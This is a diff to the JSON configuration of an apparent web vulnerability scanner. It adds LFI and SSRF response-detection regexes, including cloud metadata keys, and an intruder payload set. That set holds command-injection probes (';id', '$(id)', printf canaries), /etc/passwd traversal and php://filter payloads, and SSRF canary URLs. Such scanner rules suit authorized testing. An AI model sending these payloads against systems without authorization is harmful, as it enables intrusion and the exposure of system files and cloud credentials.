@@ -21,8 +21,11 @@
       "Node.js docs: child_process spawn/exec ENOENT, Command failed prefix",
       "Java docs: ProcessBuilder.start, Runtime.exec, IOException CreateProcess error",
       "DB engine docs: MySQL ER_PARSE_ERROR, PostgreSQL ERROR syntax, MSSQL Msg 105/102, ORA-xxxxx, SQLite OperationalError",
-      "Template engine docs: Jinja2, Twig, Freemarker, Velocity, Mako, Smarty, Thymeleaf exception classes"
-    ]
+      "Template engine docs: Jinja2, Twig, Freemarker, Velocity, Mako, Smarty, Thymeleaf exception classes",
+      "PHP manual: open_basedir, include/require 'Failed opening', 'Failed to open stream' error strings",
+      "Cloud metadata docs: AWS IMDS (169.254.169.254, /latest/meta-data, dynamic data document), GCP Metadata-Flavor, Azure IMDS instance fields"
+    ],
+    "extension_2026_11_11": "LFI/SSRF response signatures added for Robin M4 Intruder-Lite; approved by dj via VANTA dispatch same day"
   },
   "diagnostic_body_patterns": [
     {
@@ -339,6 +342,111 @@
       "precision": "low",
       "regex": "ActionView::Template::Error",
       "notes": "Rails ERB; FP-prone — audit trail only"
+    },
+    {
+      "id": "php_open_basedir",
+      "category": "lfi_response",
+      "precision": "high",
+      "regex": "open_basedir\\s+restriction\\s+in\\s+effect\\.\\s*File\\([^)]*\\)",
+      "notes": "PHP open_basedir denial on include/fopen — path traversal attempt reached the FS layer"
+    },
+    {
+      "id": "php_stream_no_file",
+      "category": "lfi_response",
+      "precision": "high",
+      "regex": "(?:include|require)(?:_once)?\\(\\)[^:]*: Failed opening (?:required )?'[^']*' for inclusion",
+      "notes": "include/require failed opening — reflected path confirms include-parameter control"
+    },
+    {
+      "id": "php_stream_no_such_file",
+      "category": "lfi_response",
+      "precision": "medium",
+      "regex": "Failed to open stream: No such file or directory",
+      "notes": "generic stream error; only diagnostic — confirm which parameter drove the path"
+    },
+    {
+      "id": "php_stream_permission",
+      "category": "lfi_response",
+      "precision": "medium",
+      "regex": "Failed to open stream: Permission denied",
+      "notes": "stream reached an unreadable target; probe path is controllable"
+    },
+    {
+      "id": "php_fs_function_error",
+      "category": "lfi_response",
+      "precision": "medium",
+      "regex": "(?:fopen|file_get_contents|readfile|fread|copy|unlink)\\([^)]*\\):\\s",
+      "notes": "filesystem PHP function error with arguments reflected — LFI candidate on file params"
+    },
+    {
+      "id": "generic_no_such_file",
+      "category": "lfi_response",
+      "precision": "low",
+      "regex": "(?i)no such file or directory",
+      "notes": "generic errno 2 echo; audit-trail only, common in unrelated errors"
+    },
+    {
+      "id": "aws_imds_listing",
+      "category": "ssrf_response",
+      "precision": "high",
+      "regex": "latest/meta-data(?:/[a-z0-9-]+)*",
+      "notes": "AWS IMDS path listing reflected in our response — internal metadata endpoint reachable"
+    },
+    {
+      "id": "aws_imds_document",
+      "category": "ssrf_response",
+      "precision": "high",
+      "regex": "\"(?:instanceId|instanceType|amiId|accountId|region|availabilityZone)\"\\s*:",
+      "notes": "AWS instance identity document (dynamic data) keys — high-confidence SSRF hit"
+    },
+    {
+      "id": "aws_imds_meta_keys",
+      "category": "ssrf_response",
+      "precision": "high",
+      "regex": "\\b(?:ami-id|instance-id|instance-type|local-ipv4|local-hostname|iam/security-credentials/)\\b",
+      "notes": "IMDSv1 plain-text metadata keys echoed back — requires independent verification"
+    },
+    {
+      "id": "gcp_metadata_header",
+      "category": "ssrf_response",
+      "precision": "high",
+      "regex": "Metadata-Flavor\\s*[:=]\\s*Google",
+      "notes": "GCP metadata server header surfaced — internal-only endpoint reachable via SSRF"
+    },
+    {
+      "id": "azure_imds_fields",
+      "category": "ssrf_response",
+      "precision": "high",
+      "regex": "\"(?:vmId|subscriptionId|resourceGroupName|osType)\"\\s*:",
+      "notes": "Azure IMDS 2019-04-01 instance fields — high-confidence SSRF hit"
+    },
+    {
+      "id": "metadata_ip_reflection",
+      "category": "ssrf_response",
+      "precision": "high",
+      "regex": "\\b169\\.254\\.169\\.254\\b",
+      "notes": "link-local metadata address reflected — probe of cloud metadata surfaced"
+    },
+    {
+      "id": "loopback_banner",
+      "category": "ssrf_response",
+      "precision": "medium",
+      "regex": "(?i)\\b(?:127\\.0\\.0\\.1|localhost)\\s*:\\s*\\d{2,5}\\b",
+      "notes": "loopback host:port echoed — internal service reachable; verify the fetch was ours"
+    },
+    {
+      "id": "loopback_service_banner",
+      "category": "ssrf_response",
+      "precision": "medium",
+      "regex": "(?i)(?:apache tomcat/\\d|welcome to nginx!|microsoft-iis/\\d|jetty\\(\\d)",
+      "notes": "server banner on a response we did not request directly — internal host reached via SSRF candidate"
+    },
+    {
+      "id": "ssrf_refused_loopback",
+      "category": "ssrf_response",
+      "precision": "low",
+      "regex": "(?i)connection refused (?:to )?127\\.0\\.0\\.1",
+      "notes": "connect error naming loopback — indicates probe reached the connect stage; audit-trail only"
     }
   ],
   "candidate_params": {
@@ -468,5 +576,117 @@
     "lfi": "(?i)\\b(file|filename|filepath|path|dir|directory|folder|page|include|inc|require|doc|document|template|tpl|load|loader|view|read|show|download|img|image|prefix|suffix|lang|locale|layout|module|component|conf|config|log|logfile|cache|tmp|temp|attachment|upload|basepath|subdir)\\b",
     "ssrf": "(?i)\\b(url|uri|dest|destination|target|redirect|redirect_uri|redirect_url|return|return_url|returnTo|next|goto|out|continue|proxy|link|src|domain|webhook|webhook_url|feed|api|api_url|callback|callback_url|fetch|site|share|open|forward|resource|endpoint|base_url)\\b",
     "idor": "(?i)\\b(id|user_id|userid|account_id|uuid|account|profile|order_id|ticket_id|doc_id|ref|ref_id|item_id|record|num|key)\\b"
+  },
+  "intruder_payloads": {
+    "rce": [
+      {
+        "id": "rce_printf_semi",
+        "value": ";printf '%s' 'MITR3_{token}';#",
+        "detects": [
+          "marker_reflection"
+        ],
+        "note": "fixed printf canary — no user-supplied command"
+      },
+      {
+        "id": "rce_printf_subst",
+        "value": "$(printf '%s' 'MITR3_{token}')",
+        "detects": [
+          "marker_reflection"
+        ],
+        "note": "command substitution canary"
+      },
+      {
+        "id": "rce_printf_pipe",
+        "value": "|printf '%s' 'MITR3_{token}'",
+        "detects": [
+          "marker_reflection"
+        ],
+        "note": "pipe canary"
+      },
+      {
+        "id": "rce_printf_amp",
+        "value": "&printf '%s' 'MITR3_{token}'",
+        "detects": [
+          "marker_reflection"
+        ],
+        "note": "background-operator canary"
+      },
+      {
+        "id": "rce_printf_backtick",
+        "value": "`printf '%s' 'MITR3_{token}'`",
+        "detects": [
+          "marker_reflection"
+        ],
+        "note": "backtick canary"
+      },
+      {
+        "id": "rce_id_semi",
+        "value": ";id",
+        "detects": [
+          "unix_id_pattern"
+        ],
+        "note": "read-only id(1) output fingerprint"
+      },
+      {
+        "id": "rce_id_subst",
+        "value": "$(id)",
+        "detects": [
+          "unix_id_pattern"
+        ],
+        "note": "substitution id(1) fingerprint"
+      }
+    ],
+    "lfi": [
+      {
+        "id": "lfi_passwd_traverse",
+        "value": "../../../../etc/passwd",
+        "detects": [
+          "unix_passwd_entry"
+        ],
+        "note": "classic traversal"
+      },
+      {
+        "id": "lfi_passwd_double_encoded",
+        "value": "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+        "detects": [
+          "unix_passwd_entry"
+        ],
+        "note": "double-encoded traversal bypass"
+      },
+      {
+        "id": "lfi_passwd_absolute",
+        "value": "/etc/passwd",
+        "detects": [
+          "unix_passwd_entry"
+        ],
+        "note": "absolute path (path traversal normalization)"
+      },
+      {
+        "id": "lfi_php_filter",
+        "value": "php://filter/convert.base64-encode/resource=/etc/passwd",
+        "detects": [
+          "php_open_basedir"
+        ],
+        "note": "PHP wrapper; base64 body change flags via diff"
+      }
+    ],
+    "ssrf": [
+      {
+        "id": "ssrf_canary_plain",
+        "value": "{canary}",
+        "detects": [
+          "oob_callback"
+        ],
+        "note": "canary URL as parameter value"
+      },
+      {
+        "id": "ssrf_canary_path",
+        "value": "{canary}/mitr3_{token}",
+        "detects": [
+          "oob_callback"
+        ],
+        "note": "canary URL with per-run path marker"
+      }
+    ]
   }
 }
